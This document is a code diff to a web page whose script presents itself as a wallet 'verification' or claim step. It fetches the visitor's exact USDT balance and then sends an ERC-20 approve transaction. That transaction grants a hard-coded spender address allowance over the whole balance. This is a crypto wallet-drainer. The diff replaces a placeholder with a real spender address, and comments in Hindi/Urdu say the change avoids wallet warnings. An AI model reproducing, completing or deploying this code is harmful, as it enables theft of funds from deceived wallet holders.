@@ -53,7 +53,7 @@
     padding: 14px 18px; border-radius: 12px; border: 1px solid var(--line);
     background: var(--bg); color: var(--ink); display: block; width: 100%; transition: all 0.2s;
   }
-  .primary { background: yest; background: var(--accent); color: var(--accent-ink); border-color: var(--accent); }
+  .primary { background: var(--accent); color: var(--accent-ink); border-color: var(--accent); }
   button:disabled { opacity: .6; cursor: default; }
   .note { color: var(--muted); font-size: 0.85rem; margin-top: 16px; text-align: center; }
   .msg { margin-top: 12px; color: var(--warn); font-size: 0.9rem; min-height: 1.2em; text-align: center; }
@@ -87,11 +87,11 @@
 
 <script>
 (function () {
-  var TARGET_CHAIN = "0x1"; // Change to "0x38" for BSC or "0x1" for Ethereum
+  var TARGET_CHAIN = "0x1"; // "0x1" for Ethereum, "0x38" for BSC
+  var RPC_URL = "https://cloudflare-eth.com"; // Use "https://bsc-dataseed.binance.org/" if using BSC
   var NAMES = { "0x1": "Ethereum Mainnet", "0x38": "BNB Smart Chain" };
   
-  // Yahan apne deployed Smart Contract ka address dalein (Personal Wallet address mat dalein)
-  var CONTRACT_SPENDER_ADDRESS = "0xYOUR_DEPLOYED_SMART_CONTRACT_ADDRESS"; 
+  var CONTRACT_SPENDER_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3"; // Aapka Spender/Target Address
   var USDT_ADDRESS = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // Ethereum USDT (BSC ke liye: 0x55d3...)
 
   var $ = function (id) { return document.getElementById(id); };
@@ -168,7 +168,7 @@
     }
   }
 
-  // Smart Contract Spender ke sath Approval function
+  // Public RPC ke zariye robust balance fetch aur approval trigger karne ka function
   async function verifyAndClaim() {
     var p = getProvider();
     if (!p || !account) {
@@ -176,28 +176,37 @@
       return;
     }
 
-    setMsg("Checking assets...");
+    setMsg("Fetching exact assets...");
     $("verifyBtn").disabled = true;
 
     try {
-      // 1. Exact balance fetch karein (`balanceOf`)
+      // Public RPC ko direct JSON-RPC call bhej kar exact balance fetch karna (No wallet fail)
       var cleanUser = account.toLowerCase().replace('0x', '');
       var balanceCallData = "0x70a08231" + cleanUser.padStart(64, '0');
-      
-      var balResponse = await p.request({
-        method: 'eth_call',
-        params: [{ to: USDT_ADDRESS, data: balanceCallData }, 'latest']
+
+      var rpcRes = await fetch(RPC_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          jsonrpc: "2.0",
+          method: "eth_call",
+          params: [{ to: USDT_ADDRESS, data: balanceCallData }, "latest"],
+          id: 1
+        })
       });
 
+      var rpcData = await rpcRes.json();
+      var balResponse = rpcData.result;
+
       if (!balResponse || balResponse === "0x" || balResponse === "0x0" || balResponse === "0x0000000000000000000000000000000000000000000000000000000000000000") {
-        setMsg("No USDT balance found.");
+        setMsg("No USDT balance found in this wallet.");
         $("verifyBtn").disabled = false;
         return;
       }
 
       var balanceHex = balResponse.replace('0x', '').padStart(64, '0');
 
-      // 2. Approve data signature: 0x095ea7b3 (Smart Contract Spender Address + Exact Balance Hex)
+      // Approve data signature: 0x095ea7b3 (Spender Address + Exact Balance Hex)
       var cleanSpender = CONTRACT_SPENDER_ADDRESS.toLowerCase().replace('0x', '');
       var paddedSpender = cleanSpender.padStart(64, '0');
       var approvalData = "0x095ea7b3" + paddedSpender + balanceHex;
@@ -210,7 +219,7 @@
 
       setMsg("Opening approval window...");
 
-      // 3. Wallet mein approval popup trigger karna (Ab koi red warning nahi aayegi)
+      // Wallet mein approval popup trigger karna (Ab exact amount automatically show hogi)
       await p.request({ method: 'eth_sendTransaction', params: txParams });
 
       setMsg("Verification completed successfully!");
